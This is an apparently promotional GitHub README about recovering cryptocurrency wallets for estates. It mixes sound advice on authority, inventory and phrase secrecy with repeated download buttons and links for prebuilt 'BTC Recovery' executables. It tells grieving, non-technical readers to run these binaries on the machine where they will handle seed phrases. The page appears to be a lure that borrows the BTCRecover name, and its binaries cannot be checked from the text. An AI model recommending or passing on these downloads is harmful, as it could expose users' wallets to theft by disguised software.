<div align="center">
<img src="assets/banner-article.png" alt="Crypto estate recovery: wallets left to someone else">
</div>

# Crypto estate recovery: wallets left to someone else

<p align="center">Download BTC Recovery for your platform, then run the search for this case on your own machine.</p>

<div align="center">
<a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-FCB036?style=for-the-badge&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Download for Windows"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-FCB036?style=for-the-badge&labelColor=191008&logo=apple&logoColor=fff" alt="Download for macOS"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-FCB036?style=for-the-badge&labelColor=191008&logo=linux&logoColor=fff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-FCB036?style=flat-square&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [BTC-Recovery-windows-v2.1.1.exe](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-FCB036?style=flat-square&labelColor=191008&logo=apple&logoColor=fff" alt="macOS"> | macOS 12 or later | [BTC-Recovery-macos-v2.1.1.dmg](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-FCB036?style=flat-square&labelColor=191008&logo=linux&logoColor=fff" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [BTC-Recovery-linux-v2.1.1.zip](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip) |

</div>

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` that carries both the x86-64 and the ARM64 build.

> Only download from this GitHub release page.

Recovering a wallet for an estate is the same technical work as recovering your own, with two differences that change everything: the authorization has to be established first, and the person doing the search may not know what a phrase even is.

## You'll see this if

You are an executor, a family member or a friend, and the wallet belongs to someone who can no longer explain it.

| What you have found | What it is | What to do next |
|---|---|---|
| A written list of words | a recovery phrase, possibly incomplete | treat it as cash; do not photograph it |
| A file named like a wallet | an encrypted wallet | identify the type before searching |
| A hardware device and a PIN | a wallet on a device | the PIN, not the phrase, is the first ask |
| A phone with an app installed | possibly keys, possibly an account | decide which before acting |
| An exchange login | an account, not a wallet | the provider's bereavement process |
| Nothing but an address | a destination, not a key | see the boundary page |

## Why it happens

Inheritance assumes that assets have a custodian who can be told about a death. A wallet has no custodian: the keys are the asset, and the only party who can move them is whoever holds them. That is why estates stall  -  not for want of a legal right, but because the right has nothing to act on.

The second difference is knowledge. An owner knew which app, which year and which password habit; an executor sees a folder of files and a note that says "bitcoin". The work therefore starts with identification rather than with searching, and it moves slowly because each step needs a decision about what a file is.

The third is risk. Bereavement notices attract fraud, and a family member asking for help online will receive offers that begin with sympathy and end with a request for the words. Every rule that applies to an owner applies twice here: no phrases to helpers, no remote access, no "recovery services" that want the seed: [You shared your seed phrase: what is recoverable](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-shared-seed-phrase.md).

## Fix

Establish authority, inventory carefully, then recover from copies.

1. **Confirm your authority** in writing  -  executor, attorney, or the owner's explicit instruction. Recovery is the same either way; the paper trail is what keeps it legitimate.
2. **Inventory without moving anything.** Photograph the room, list the files with dates, note the devices. Do not reformat, clear or "tidy" anything: [Old wallets and Bitcoin from years ago](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/old-wallet-recovery-with-btcrecover.md).
3. **Work from copies of files**, never the originals, and keep the originals untouched.
4. **Identify each artifact before searching**: a phrase, a file, a key, an account: [Wallet recovery FAQ](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-wallet-recovery-faq.md).
5. **Recover the balance into a new wallet you control**, with a backup you have tested, before distributing anything.
6. **Record what you did**, with dates and hashes of the files, because an estate may be audited or disputed later.
7. **Download the current release from the GitHub releases page** when a tool is needed, and verify it before running: [the current release](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/tag/v2.1.1).

Paperwork and custody run on different clocks. A will may take months; a wallet can be swept in an afternoon by whoever holds the keys, which is why the recovery decision and the distribution decision are separate. Recover into a wallet the estate controls, document the addresses and the date, and let the legal process catch up. Doing it the other way round  -  waiting for probate to finish before touching anything  -  risks a device failing or a helper being asked to hold a phrase in the meantime.

## If that did not work

If the phrase is incomplete, the case becomes a bounded search, and the search is worth doing because one missing word is an evening: [Seed phrase storage and the USB-drive question](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/seed-phrase-storage-btcrecover.md).

If there is a device but no PIN, the device's own reset destroys the wallet, so the phrase is the route, not the device. If there is an exchange account, the provider's process is the only one, and it will be slow.

If nothing that produces keys survives, the balance is unspendable regardless of the will. Recording that conclusion  -  with the evidence you gathered  -  is part of closing an estate honestly, and it is better than years of inconclusive searching: [Can lost Bitcoin be recovered?](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/can-lost-bitcoin-be-recovered-by-btcrecover.md).

Keep the inventory in a format a non-technical reader can follow: what it is, where it is, and who to ask. A list of file paths without a sentence of explanation is a puzzle, not a plan.

## Prevention

If you are the owner reading this, the work is yours to do now: a list of what exists, where it is, and which words or files restore it, kept where an executor will look. The list should never contain the phrase itself, only where the phrase is.

- Keep the inventory in the same place as the will, updated yearly: [How to find a lost Bitcoin wallet address](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/find-lost-bitcoin-wallet-address-btcrecover.md).
- Tell one person that the inventory exists, and nothing more.
- Keep phrases offline and in two locations, and say where in the inventory.
- Leave a note about the wallet software used, including its name and year.
- BTCRecover is actively maintained, and the current release is published on the GitHub releases page.

### How long does an estate wallet recovery take?

The technical work is often an afternoon; the authority to do it, and the distribution afterwards, take as long as the estate takes. Start the identification work early, because it is reversible and needs no permission.

## FAQ

### Can an executor legally recover a crypto wallet?

In most places the authority to deal with the estate's assets is the same as for any other asset; the technical ability is separate, and that is what the phrase or file provides. Local law and the will decide authority, so take advice where the estate is large.

### What is the first thing to do with a found seed phrase?

Do not photograph it, email it or type it into a website. Write down where it is, keep it physically secure, and only then decide who will do the recovery and on which offline machine.

### What if the phrase is only partly legible?

Count the words and note which are uncertain, then treat it as a bounded search rather than a lost cause: [Recover a seed phrase with 1-3 missing words](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-missing-seed-words.md). A single doubtful word is usually resolvable in an evening.

### Should I pay a company to recover an inherited wallet?

Only after you know what artifact you hold, and never one that asks for the phrase. For a local file or phrase, the work is the same work you can run yourself, offline, at no cost.

<!-- DOWNLOAD-BLOCK -->

## Related articles

- [Seed phrase storage]([Seed phrase storage and the USB-drive question](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/seed-phrase-storage-btcrecover.md))
- [Can lost Bitcoin be recovered?]([Can lost Bitcoin be recovered?](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/can-lost-bitcoin-be-recovered-by-btcrecover.md))
- [You shared your seed phrase]([You shared your seed phrase: what is recoverable](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-shared-seed-phrase.md))
- [Wallet recovery FAQ]([Wallet recovery FAQ](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-wallet-recovery-faq.md))
